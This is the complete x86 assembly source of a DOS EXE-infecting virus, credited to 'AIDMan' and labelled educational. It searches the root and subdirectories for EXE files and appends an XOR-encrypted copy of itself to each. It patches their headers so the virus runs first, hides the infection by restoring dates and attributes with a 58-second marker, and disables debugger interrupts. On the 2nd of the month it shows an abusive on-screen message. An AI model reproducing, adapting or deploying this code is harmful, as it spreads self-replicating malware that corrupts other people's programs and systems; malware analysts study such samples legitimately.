   ;--------------------------------------------
   ; Copyright AIDMan, 97-99 VSU
   ; This file is for educational purposes only
   ; if you are not agree please go away
   ;--------------------------------------------
   filename  EQU 30
   fileattr  EQU 21
   filedate  EQU 24
   filetime  EQU 22
   filesize  EQU 1Ah
   ;---------------------------------
   CODE SEGMENT 'code'
   ASSUME cs:code,ds:code,es:code
   ORG 100h
   MAIN PROC
   body:mov bx,ss                    ; BX = SS
        mov dx,sp                    ; DX = SP
        mov ax,cs
        mov ss,ax
        mov sp,0fffeh
        call next
   next:pop bp
        cld
        jmp start
   enc_val    db 0
   ;--------------
   Signature  dw 0
   PartPag    dw 0
   Pagecnt    dw 0
   ReloCnt    dw 0
   HdrSize    dw 0
   MinMem     dw 0
   MaxMem     dw 0
   ReloSS     dw 0
   ExeSP      dw 0
   ChkSum     dw 0
   ExeIP      dw 0
   ReloCS     dw 0
   ;--------------
   OldIP      dw 0
   OldCS      dw 0
   OldES      dw 0
   OldSS      dw ?
   OldSP      dw ?
   HiFSize    dw 0
   LoFSize    dw 0
   HiSize     dw 0
   LoSize     dw 0
   ;---------------------------------------------------
   start:  sub bp,10Eh ;
           mov word ptr cs:[OldSS]+bp,bx              ; BX = SS
           mov word ptr cs:[OldSP]+bp,dx              ; DX = SP
           call _pushDS                               ; save DS, DS=CS
           call encrypt                               ; encrypting procedure
           jmp virus
   encrypt:mov cx,enc_size
           mov bx,word ptr cs:[enc_val+bp]
           push bp
           pop si
           add si,offset vir_data
   enc_loop:       xor     cs:[si],bx
                   inc     si
                   push    es                      ; AntiWeb BUG
                   mov     ax,60h
                   mov     es,ax
                   mov     word ptr es:[7],bx
                   mov     bx,1999h
                   mov     bx,word ptr es:[7]
                   inc     si
                   add     bx,0
                   pop     es
                   mov     ax,46h
                   mov     es,ax
                   mov     ax,word ptr es:[0Ch]
                   cmp     word ptr es:[0Dh],ax
                   je      stuff
                   loop    enc_loop
                   ret
   stuff:          int     20h
   ;--------------------------------------
   int21h: pushf
           call dword ptr cs:[addr21]+bp
           ret
   addr21: dd 0
   ;--------------------------------------
   _pushDS:mov word ptr cs:[OldES]+bp,ds                ; save old ES
           xor ax,ax
           mov es,ax
           mov di,4
           cli
           cld                                          ; stosw : ES:DI <- AX
           stosw                                        ; int 1
           stosw
           add di,4
           stosw                                        ; int 3
           stosw
           sti                                          ; STUFF
           sub word ptr cs:[oper3]+bp,7182h ; FUNNY BUG = push cs,pop ds
           call oper3                       ; for push cs,pop es = 8982h
           add word ptr cs:[oper3]+bp,7182h
           ret
   oper3:  nop
           nop
           ret
   _saveDS:
   ;--------------------------------------
   infectfile:mov ah,3fh
              mov cx,18h
              mov dx,offset Signature
              add dx,bp
              call int21h                    ; read header of EXE
   ;           mov cx,0fff0h
   ;           cmp cx,word ptr [ReloCS]+bp    ; check is packed with PKLITE
   ;           jne @next3
   ;           ret
   ;           @next3:
              mov ax,word ptr [ExeIP]+bp
              mov word ptr [OldIP]+bp,ax
              mov ax,word ptr [ReloCS]+bp
              mov word ptr [OldCS]+bp,ax     ; save CS:IP

              mov bx,word ptr [handle]+bp
              xor cx,cx
              xor dx,dx
              mov ax,4202h                   ; seek the pointer to the end
              call int21h                    ; DX:AX = new position
              mov word ptr [HiFSize]+bp,dx
              mov word ptr [LoFSize]+bp,ax   ; Save File Length
              ;-------------------------------
              ; oldIP:=ExeIP                 ;
              ; oldCS:=ReloCS                ;
              ; ExeIP:=fsize mod 16          ;
              ; ReloCS:=fsize div 16-HdrSize ;
              ; fsize:=fsize+sizeof(exepsw)  ;
              ; PageCnt:=fsize div 512+1     ;
              ; PartPag:=fsize mod 512       ;
              ;-------------------------------
              xor bx,bx
              mov cx,4
              db 0fh
              db 0adh                        ; AX=LoDD,DX=HiDD
              db 0d0h                        ; CX=count bits
              shr dx,cl                      ; returns : dd(DX,AX)
   ;----------------------------
              mov bx,ax
              sub bx,word ptr [HdrSize]+bp
              mov word ptr [ReloCS]+bp,bx    ; Set ReloCS = fsize div 16
   ;----------------------------
              xor bx,bx
              mov cx,4
              db 0fh
              db 0a5h
              db 0c2h
              shl ax,cl
   ;----------------------------
              mov word ptr [HiSize]+bp,dx    ; DX = shl (shr 4)
              mov word ptr [LoSize]+bp,ax    ; AX = shl (shr 4)
              mov dx,word ptr [HiFSize]+bp   ; DX = old fsize
              mov ax,word ptr [LoFSize]+bp   ; AX = old fsize
              sub ax,word ptr [LoSize]+bp
              sbb dx,word ptr [HiSize]+bp
              mov word ptr [ExeIP]+bp,ax     ; Set ExeIP
   ;---------------------------------------------------------------------
              xor dx,dx
              mov ax,(offset _end - offset body)
              add ax,word ptr [LoFSize]+bp
              adc dx,word ptr [HiFSize]+bp   ; DX:AX = new filesize
              mov word ptr [HiFSize]+bp,dx
              mov word ptr [LoFSize]+bp,ax
   ;---------------------------------------------------------------------
              mov cx,9
              xor bx,bx
              db 0fh
              db 0adh
              db 0d0h
              shr dx,cl
   ;---------------------------------------
              mov bx,ax
              inc bx
              mov word ptr [PageCnt]+bp,bx    ; PageCnt = newfsize div 512+1
   ;---------------------------------------
              xor bx,bx
              mov cx,9
              db 0fh
              db 0a5h
              db 0c2h
              shl ax,cl
   ;---------------------------------------
              mov word ptr [HiSize]+bp,dx    ; DX = shl (shr 9)
              mov word ptr [LoSize]+bp,ax    ; AX = shl (shr 9)
              mov dx,word ptr [HiFSize]+bp   ; DX = old fsize + body
              mov ax,word ptr [LoFSize]+bp   ; AX = old fsize + body
              sub ax,word ptr [LoSize]+bp
              sbb dx,word ptr [HiSize]+bp
              mov word ptr [PartPag]+bp,ax   ; PartPag = newfsize mod 512
   ;------------------------------------------------------------------------
              mov bx,word ptr [handle]+bp
              xor cx,cx
              xor dx,dx
              mov ax,4200h                   ; seek the pointer to the BEGIN
              call int21h

              mov ah,40h
              mov cx,18h
              mov dx,offset Signature
              add dx,bp
              call int21h                    ; write header of EXE
              xor cx,cx
              xor dx,dx
              mov ax,4202h                   ; seek the pointer to the end
              call int21h
   ;---------------------------------------------------------
              push bx
              call encrypt                       ; encrypt
              mov cx,(offset _end - offset body) ; length of virus in cx
              mov dx,offset body
              add dx,bp
              pop bx
              mov ah,40h
              call int21h
              call encrypt                       ; decrypt
              ret
              nop
   ;---------------------------------------------------------
   vir_data: rootdir    db "\",0
             wildcards  db "*",0
             filespec   db "*.EXE",0
             dirdata    db 43 dup (?)
             filedata   db 43 dup (?)
             currentdir db 64 dup (?)
             idbuffer   dw ?
             tempseg    dw ?
             tempofs    dw ?
             old24es    dw ?
             old24bx    dw ?
             diskdtaseg dw ?
             diskdtaofs dw ?
             handle     dw ?
             orig_time  dw ?
             orig_date  dw ?
             orig_attr  dw ?
             FileCS     dw ?
             FileIP     dw ?
             drivecode  db ?
             message    db ' ÉÍÍÍÍ  Virus Warning : ÍÍÍÍ» '
                        db ' º BADMAN gone! So some new º '
                        db ' º STUPID ASHOLES come here º '
                        db ' º and I`LL HATE them too.  º '
                        db ' ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼ '
             tg         db 0
             Copyright  db 'Old AIDMan.VSU'
   ;--------------------------------------------------------
   showm:
       xor ax,ax                             ; show message
       mov ah,0b8h
       mov es,ax
       mov si,0
       mov bh,78
       mov di,1488
   @5:mov cx,30
   @4:mov bl,byte ptr [message]+si+bp
      mov word ptr es:[di],bx
      inc di
      inc di
      inc si
      loop @4
      add di,100
      cmp di,88Ch                            ; place on the screen
      jl @5
      mov cx,250
   @7:mov ax,4
      mov dx,3C8h
      out dx,al
      mov ax,cx
      mov dx,3C9h
      out dx,al
      xor ax,ax
      out dx,al                             ; R=loCX G=0 B=0
      out dx,al
      push cx
      mov cx,0fffeh
   @8:loop @8                                ; wait
      mov cx,0fffeh
   @9:loop @9                                ; wait
      pop cx
      loop @7
      xor ax,ax                              ; set old blue
      inc ax
      mov dx,3C8h
      out dx,al
      xor ax,ax
      mov dx,3C9h
      out dx,al                              ; R
      out dx,al                              ; G
      mov al,35                              ; B
      out dx,al
      mov ax,3
      int 10h
      ret
   ;--------------------------------------------------------
   int24h: mov al,3
           iret
   ;--------------------------------------------------------
   virus:
   xor bx,bx
   mov es,bx
   mov bx,word ptr es:[84h]
   mov word ptr [addr21]+bp,bx               ; Offset Addr21h
   mov bx,word ptr es:[86h]
   mov word ptr [addr21+2]+bp,bx             ; Segment Addr21h

   mov bx,word ptr [OldCS]+bp
   mov word ptr [FileCS]+bp,bx
   mov bx,word ptr [OldIP]+bp
   mov word ptr [FileIP]+bp,bx

   xor bx,bx
   mov ah,2ch
   call int21h                               ; Get current time
   mov word ptr [enc_val]+bp,dx              ; dl = 0..99 , dh = 0..29 -?
   mov ah,19h
   call int21h                               ; get current DRIVE

   mov dl,al
   inc dl
   mov ah,47h
   mov si,offset currentdir
   add si,bp
   call int21h                               ; get current DIRECTORY

   mov ax,3524h
   call int21h                               ; get int24h
   mov word ptr [old24es]+bp,es
   mov word ptr [old24bx]+bp,bx
   mov dx,offset int24h                      ; hold ES:BX
   add dx,bp
   mov ah,25h
   call int21h                               ; set int24h

   mov byte ptr [tg]+bp,1
   jmp @dirloop3
   @back:
   mov byte ptr [tg]+bp,0

   mov dx,offset dirdata
   add dx,bp
   mov ah,1ah
   call int21h                               ; set DTA

   mov dx,offset rootdir
   add dx,bp
   mov ah,3bh
   call int21h                               ; change DIRECTORY to ROOT
   mov cx,13h
   mov dx,offset wildcards
   add dx,bp
   mov ah,4eh
   call int21h                               ; find first DIRECTORY in ROOT
   cmp ax,12h
   jne @dirloop2
   jmp @bus

   @dirloop:
   mov ah,4fh
   call int21h                               ; find next DIRECTORY
   cmp ax,12h
   je @bus

   @dirloop2:
   mov dx,offset dirdata+filename
   add dx,bp
   mov ah,3bh
   call int21h                               ; change DIRECTORY to ROOT
   mov ah,2fh                                ; get disk DTA
   call int21h
   mov word ptr [diskdtaseg]+bp,es
   mov word ptr [diskdtaofs]+bp,bx           ; hold DISK DTA


   @dirloop3:
   mov dx,offset filedata
   add dx,bp
   mov ah,1ah
   call int21h                               ; set new FILE DTA
   mov cx,07h
   mov dx,offset filespec
   add dx,bp
   mov ah,4eh
   call int21h                               ; find first FILE
   cmp ax,12h
   jne @transform                            ; if find then transform it

   @nextexe:
   mov ah,4fh
   call int21h                               ; find next EXE
   cmp ax,12h
   jne @transform


   go_out:
   cmp byte ptr [tg]+bp,1
   je @back                       ; finished with current dir

   mov dx,offset rootdir          ; if no EXE found then change DIRECTORY
   add dx,bp
   mov ah,3bh
   call int21h                               ; now in ROOT
   mov ah,1ah
   mov ds,word ptr [diskdtaseg]+bp
   mov dx,word ptr [diskdtaofs]+bp
   call int21h                               ; set DISK DTA again
   jmp @dirloop                              ; go to search

   @bus:mov dx,offset currentdir
        add dx,bp
        mov ah,3bh
        call int21h
        jmp @bus1

   @transform:
   mov ah,2fh
   call int21h                               ; get FILE DTA
   mov [tempseg]+bp,es
   mov [tempofs]+bp,bx                       ; hold FILE DTA


   mov dx,offset filedata+filename
   add dx,bp
   mov bx,offset filedata
   add bx,bp
   mov ax,[bx]+filedate
   mov word ptr [orig_date]+bp,ax
   mov ax,[bx]+filetime
   mov word ptr [orig_time]+bp,ax            ; store original date,time
   and al,1dh
   cmp al,1dh                                ; if time = 58 sec
   je @fixup

   mov ax,4300h
   call int21h                               ; get original attributes
   mov word ptr [orig_attr]+bp,cx            ; store original attributes
   mov ax,4301h
   xor cx,cx
   call int21h                               ; clear attributes
   jc @fixup
   jmp @doit                                 ; if not infected then
                                             ; I'll do it
   @fixup:
   mov ds,[tempseg]+bp
   mov dx,[tempofs]+bp
   mov ah,1ah
   call int21h                               ; recover old FILE DTA
   jmp @nextexe                              ; go to search

   @doit:
   nop
   mov dx,offset filedata+ filename
   add dx,bp                                 ; DS:DX = filename
   mov ax,3d02h                              ; read/write
   call int21h                               ; open file
   mov word ptr [handle]+bp,ax
   mov bx,ax
   call infectfile                           ; INFECT FILE
   mov ax,5701h
   mov bx,word ptr [handle]+bp
   mov cx,word ptr [orig_time]+bp
   and cx,1111111111100000b
   or  cx,0000000000011101b
   mov dx,word ptr [orig_date]+bp
   call int21h                              ; recover old date, and set 58 sec
   mov ax,4301h
   mov cx,word ptr [orig_attr]+bp
   mov dx,offset filedata+filename
   add dx,bp
   call int21h                               ; recover old attributes

   mov ah,3eh
   mov bx,word ptr [handle]+bp
   call int21h                               ; close file

   mov ds,[tempseg]+bp
   mov dx,[tempofs]+bp
   mov ah,1ah
   call int21h                               ; recover old FILE DTA
   ;jmp go_out                               ; go to search one more EXE
   jmp @fixup                                ; go to search one more EXE

   @bus1:
       mov ah,2Ah
       call int21h
       cmp al,2
       jne @bus2
       call showm
   @bus2:

   mov ds,word ptr cs:[old24es]+bp
   mov dx,word ptr cs:[old24bx]+bp
   mov ax,2524h
   call int21h                               ; restore old int24h

   cmp bp,0
   je @dos                                   ; if .COM working
   mov dx,word ptr cs:[OldES]+bp             ; recover old ES in DX
   push dx
   pop es                                    ; ES=DX
   push es
   pop ds                                    ; DS=ES=DX
   mov bx,es
   add bx,10h
   add bx,cs:[FileCS]+bp
   mov word ptr cs:[patch+2]+bp,bx           ; Set SEGM in JMP
   mov bx,cs:[FileIP]+bp
   mov word ptr cs:[patch]+bp,bx             ; Set OFFS in JMP
   xor ax,ax
   xor bx,bx
   xor cx,cx
   xor dx,dx
   xor si,si
   xor di,di
   xor bp,bp                                 ; Clear Registers
   mov ss,word ptr cs:[OldSS]+bp
   mov sp,word ptr cs:[OldSP]+bp
         db 0eah
   patch dd 0                                ; JMP OldCS:OldIP
   @dos:
   mov ax,4C00h                              ; ALL DONE
   call int21h
   ;---------------------------------------------
   _end db 90h
   main endp

   vir_end:
   vir_size        equ     offset vir_end-offset body
   enc_size        equ     (offset vir_end-offset body)/02h
   code ends
   end main
